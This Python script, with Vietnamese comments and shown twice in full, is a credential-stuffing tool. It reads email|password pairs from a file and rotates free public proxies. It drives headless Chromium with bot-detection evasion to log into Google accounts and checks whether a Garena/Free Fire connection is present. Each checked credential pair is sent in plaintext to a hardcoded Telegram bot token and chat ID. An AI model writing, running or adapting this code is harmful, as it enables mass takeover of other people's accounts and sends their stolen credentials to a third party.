import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- THÔNG TIN TELEGRAM ĐÃ CẤU HÌNH ---
TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
TELE_CHAT_ID = "6706357035"
FILE_INPUT = "acc.txt"

def send_tele(message):
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    payload = {"chat_id": TELE_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def get_proxies():
    # Quét proxy miễn phí
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        return res.text.strip().split('\r\n')
    except:
        return []

def check_acc(email, password, proxies):
    # Lấy 10 proxy ngẫu nhiên để thử cho mỗi acc
    sample_proxies = random.sample(proxies, min(len(proxies), 10))
    
    for i, proxy in enumerate(sample_proxies):
        print(f"[*] Thử Proxy {i+1}/10 cho {email} ({proxy})")
        
        options = Options()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.binary_location = "/usr/bin/chromium" # Đường dẫn trên Railway

        service = Service("/usr/bin/chromedriver")
        driver = None
        
        try:
            driver = webdriver.Chrome(service=service, options=options)
            wait = WebDriverWait(driver, 15)
            
            # 1. Đăng nhập Google
            driver.get("https://accounts.google.com/signin")
            
            email_el = wait.until(EC.presence_of_element_located((By.NAME, "identifier")))
            email_el.send_keys(email)
            driver.find_element(By.ID, "identifierNext").click()
            time.sleep(3)
            
            pass_el = wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
            pass_el.send_keys(password)
            driver.find_element(By.ID, "passwordNext").click()
            
            time.sleep(7) # Đợi load qua xác minh
            
            # Nếu vẫn ở trang login hoặc url chứa 'v2/signin/identifier' -> Chưa log được
            if "signin" in driver.current_url:
                driver.quit()
                continue
            
            # 2. Vào trang check liên kết ứng dụng
            driver.get("https://myaccount.google.com/connections")
            time.sleep(5)
            
            html = driver.page_source.lower()
            if "garena" in html or "free fire" in html:
                msg = f"✅ LIVE FF: {email}|{password}"
            else:
                msg = f"❌ NO FF: {email}|{password}"
            
            print(msg)
            send_tele(msg)
            driver.quit()
            return True
            
        except Exception as e:
            if driver:
                driver.quit()
            continue # Thử proxy tiếp theo nếu lỗi mạng/proxy

    # Sau 10 lần proxy vẫn không login được
    print(f"⚠️ DIE/CHECKPOINT: {email}")
    return False

def main():
    send_tele("🚀 TOOL ĐÃ BẮT ĐẦU CHẠY TRÊN RAILWAY...")
    
    if not os.path.exists(FILE_INPUT):
        send_tele("❌ Lỗi: Không tìm thấy file acc.txt!")
        return

    proxies = get_proxies()
    if not proxies:
        send_tele("❌ Lỗi: Không lấy được danh sách Proxy!")
        return

    with open(FILE_INPUT, "r") as f:
        accounts = [l.strip() for l in f if "|" in l]

    for acc in accounts:
        email, password = acc.split("|")
        check_acc(email, password, proxies)
        # Nghỉ để tránh Google quét IP Railway
        time.sleep(random.randint(10, 20))

if __name__ == "__main__":
    main()
import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- THÔNG TIN TELEGRAM ĐÃ CẤU HÌNH ---
TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
TELE_CHAT_ID = "6706357035"
FILE_INPUT = "acc.txt"

def send_tele(message):
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    payload = {"chat_id": TELE_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def get_proxies():
    # Quét proxy miễn phí
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        return res.text.strip().split('\r\n')
    except:
        return []

def check_acc(email, password, proxies):
    # Lấy 10 proxy ngẫu nhiên để thử cho mỗi acc
    sample_proxies = random.sample(proxies, min(len(proxies), 10))
    
    for i, proxy in enumerate(sample_proxies):
        print(f"[*] Thử Proxy {i+1}/10 cho {email} ({proxy})")
        
        options = Options()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.binary_location = "/usr/bin/chromium" # Đường dẫn trên Railway

        service = Service("/usr/bin/chromedriver")
        driver = None
        
        try:
            driver = webdriver.Chrome(service=service, options=options)
            wait = WebDriverWait(driver, 15)
            
            # 1. Đăng nhập Google
            driver.get("https://accounts.google.com/signin")
            
            email_el = wait.until(EC.presence_of_element_located((By.NAME, "identifier")))
            email_el.send_keys(email)
            driver.find_element(By.ID, "identifierNext").click()
            time.sleep(3)
            
            pass_el = wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
            pass_el.send_keys(password)
            driver.find_element(By.ID, "passwordNext").click()
            
            time.sleep(7) # Đợi load qua xác minh
            
            # Nếu vẫn ở trang login hoặc url chứa 'v2/signin/identifier' -> Chưa log được
            if "signin" in driver.current_url:
                driver.quit()
                continue
            
            # 2. Vào trang check liên kết ứng dụng
            driver.get("https://myaccount.google.com/connections")
            time.sleep(5)
            
            html = driver.page_source.lower()
            if "garena" in html or "free fire" in html:
                msg = f"✅ LIVE FF: {email}|{password}"
            else:
                msg = f"❌ NO FF: {email}|{password}"
            
            print(msg)
            send_tele(msg)
            driver.quit()
            return True
            
        except Exception as e:
            if driver:
                driver.quit()
            continue # Thử proxy tiếp theo nếu lỗi mạng/proxy

    # Sau 10 lần proxy vẫn không login được
    print(f"⚠️ DIE/CHECKPOINT: {email}")
    return False

def main():
    send_tele("🚀 TOOL ĐÃ BẮT ĐẦU CHẠY TRÊN RAILWAY...")
    
    if not os.path.exists(FILE_INPUT):
        send_tele("❌ Lỗi: Không tìm thấy file acc.txt!")
        return

    proxies = get_proxies()
    if not proxies:
        send_tele("❌ Lỗi: Không lấy được danh sách Proxy!")
        return

    with open(FILE_INPUT, "r") as f:
        accounts = [l.strip() for l in f if "|" in l]

    for acc in accounts:
        email, password = acc.split("|")
        check_acc(email, password, proxies)
        # Nghỉ để tránh Google quét IP Railway
        time.sleep(random.randint(10, 20))

if __name__ == "__main__":
    main()
